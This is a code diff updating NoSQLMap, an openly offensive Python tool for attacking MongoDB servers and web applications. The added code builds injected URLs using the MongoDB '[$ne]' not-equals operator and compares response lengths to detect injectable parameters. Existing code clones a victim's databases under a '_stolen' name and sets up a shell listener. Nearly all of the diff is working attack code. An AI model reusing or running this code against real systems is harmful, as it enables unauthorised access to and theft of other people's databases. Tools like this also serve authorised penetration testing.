@@ -15,7 +15,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.01-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.04-by Russell Butturini(tcstool@gmail.com)"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -60,7 +60,7 @@ def options():
 		print "6-Set shell listener port"
 		print "7-Back to main menu"
 
-		select = raw_input("Select an option:")
+		select = raw_input("Select an option: ")
 		
 		if select == "1":
 			victim = raw_input("Enter the host IP/DNS name: ")
@@ -68,12 +68,12 @@ def options():
 			options()
 			
 		elif select == "2":
-			webPort = raw_input("Enter the HTTP port for web apps:")
+			webPort = raw_input("Enter the HTTP port for web apps: ")
 			print "HTTP port set to " + webPort + "\n"
 			options()
 
 		elif select == "3":
-			uri = raw_input("Enter URI Path (Press enter for no URI:")
+			uri = raw_input("Enter URI Path (Press enter for no URI): ")
 			print "URI Path set to " + uri + "\n"
 			options()
 
@@ -166,14 +166,18 @@ def netAttacks(target):
 	
 	
 def webApps():
-	print "Checking to see if web server at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
+	paramName = []
+	paramValue = []
+	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
-	appURL = "http://" + str(victim) + ":" + str(webPort) #+ str(uri)
+	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
 	appRespCode = urllib.urlopen(appURL).getcode()
 	
 	try:
 		if appRespCode == 200:
-			print "App is up, starting injection test."
+			normLength = int(len(urllib.urlopen(appURL).read()))
+			
+			print "App is up! Got response length of " + str(normLength) + ".  Starting injection test.\n"
 			appUp = True
 		
 		else:
@@ -185,8 +189,23 @@ def webApps():
 			
 		injectSize = raw_input("Baseline test-Enter random string size: ")
 		injectString = randInjString(int(injectSize))
+		print "Using " + injectString + " for injection testing.\n"
 		
-		print "Injecting " + injectString + " for baseline response size..."
+		randomUri = buildUri(appURL,injectString)
+		print "Checking random injected parameter HTTP response size...\n"
+		randLength = int(len(urllib.urlopen(randomUri).read()))
+		print "Got response length of " + str(randLength) + "."
+		
+		randNormDelta = abs(normLength - randLength)
+		
+		if randNormDelta == 0: 
+			print "No change in response size injecting a random parameter..\n"
+		else:
+			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
+			
+		print "Testing Mongo PHP not equals associative array injection..."
+		
+		
 	
 	raw_input("Press enter to continue...")
 	return()
@@ -194,10 +213,37 @@ def webApps():
 def randInjString(size):
 	chars = string.ascii_letters + string.digits
 	return ''.join(random.choice(chars) for x in range(size))
+
+def buildUri(origUri, randValue):
+	paramName = []
+	paramValue = []
+	global neqUri
 	
+	split_uri = origUri.split("?")
+	params = split_uri[1].split("&")
 	
+	for item in params:
+		index = item.find("=")
+		paramName.append(item[0:index])
+		paramValue.append(item[index + 1:len(item)])
+	print "List of parameters:"
+	print "\n".join(paramName)
+	injOpt = raw_input("Which parameter should we inject?")
+	evilUri = split_uri[0] + "?"
+	neqUri = split_uri[0] + "?"
+	x = 0
 	
-	
+	for item in paramName:		
+		if paramName[x] == injOpt:
+			evilUri += paramName[x] + "=" + randValue + "&"
+			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
+		else:
+			evilUri += paramName[x] + "=" + paramValue[x] + "&"
+			neqUri += paramName[x] + "=" + paramValue[x] + "&"
+			
+	#Clip the last & off
+	evilUri = evilUri[:-1]
+	return evilUri	
 
 def stealDBs(myDB):
 	menuItem = 1	
@@ -215,7 +261,7 @@ def stealDBs(myDB):
 		
 	try:
 		myDBConn = pymongo.MongoClient(myDB,27017)
-		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",host)	
+		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		cloneAnother = raw_input("Database cloned.  Copy another?")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
@@ -225,7 +271,7 @@ def stealDBs(myDB):
 			return()
 	
 	except:
-		print "Something went wrong.  Are you sure your MongoDB is running?"
+		print "Something went wrong.  Are you sure your MongoDB is running?" , sys.exc_info()
 		stealDBs(myDB)								
 	
 mainMenu()
